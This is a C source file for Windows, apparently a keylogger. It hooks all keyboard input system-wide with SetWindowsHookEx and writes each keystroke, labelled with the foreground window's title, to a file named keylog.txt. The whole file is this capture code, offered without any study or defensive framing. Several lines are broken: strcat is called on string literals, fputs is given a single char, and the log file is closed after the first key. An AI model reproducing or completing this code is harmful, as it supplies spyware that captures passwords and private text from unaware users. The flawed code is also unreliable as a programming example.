#include <stdio.h>
#include <Windows.h>

#define PROG_NAME_LENGTH 256
#define SPECIALS_LENGTH 22

const int SPECIALS_CODES[SPECIALS_LENGTH] = {VK_BACK, VK_RETURN, VK_SPACE, VK_TAB, VK_SHIFT, VK_RSHIFT, VK_LSHIFT, VK_CONTROL,
    VK_LCONTROL, VK_RCONTROL, VK_ESCAPE, VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_END, 190, 110, 189, 109, 20};

const char* SPECIALS[SPECIALS_LENGTH] = { "[BACKSPACE]", "\n", " ", "[TAB]", "[SHIFT]", "[R_SHIFT]", "[L_SHIFT]", "[CTRL]", 
    "[L_CTRL]", "[R_CTRL]", "[ESC]", "[HOME]", "[LEFT]", "[RIGHT]", "[UP]", "[DOWN]", "[END]", ".", ".", "-", "-", "[CAPS_LOCK]"};

HHOOK hook;
KBDLLHOOKSTRUCT kb_struct;
FILE* file;

int find_key(int key) {
    for (int i = 0; i < SPECIALS_LENGTH; i++) {
        if (SPECIALS_CODES[i] == key) {
            return i;
        }
    }

    return -1;
}

int save(int key) {
    if (key == 1 || key == 2) {
        return 0;
    }

    HWND foreground = GetForegroundWindow();
    DWORD thread_id;
    HKL keyboard;
    char prev_prog_name[PROG_NAME_LENGTH] = "\0";
    char curr_prog_name[PROG_NAME_LENGTH];

    if (foreground != NULL) {

        thread_id = GetWindowThreadProcessId(foreground, NULL);
        keyboard = GetKeyboardLayout(thread_id);

        GetWindowTextA(foreground, curr_prog_name, PROG_NAME_LENGTH);

        if (strcmp(curr_prog_name, prev_prog_name) != 0) {
            strcpy(prev_prog_name, curr_prog_name);
            fputs(strcat(strcat("\n\n--------Program: ", curr_prog_name), "--------\n\n"), file);
        }
    }
    else {
      keyboard = NULL;
    }

    printf("%d\n", key);

    int i = find_key(key);
    if (i > 0) {
        fputs(strcat(SPECIALS[i], "\n"), file);
    }
     
    char curr_key;

    curr_key = (char) MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboard);
    fputs(curr_key, file);
    fclose(file);

    return 0;
}

LRESULT __stdcall hook_callback(int n_code, WPARAM w_param, LPARAM l_param) {
    if (n_code >= 0) {
        if (w_param == WM_KEYDOWN) {
            kb_struct = *((KBDLLHOOKSTRUCT*)l_param);
            save(kb_struct.vkCode);
        } 
    }

    return CallNextHookEx(hook, n_code, w_param, l_param);
}

int main() {
    file = fopen("keylog.txt", "w");

    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_callback, NULL, 0);

    MSG message;
    while (1) {
        GetMessage(&message, NULL, 0, 0);
    }
}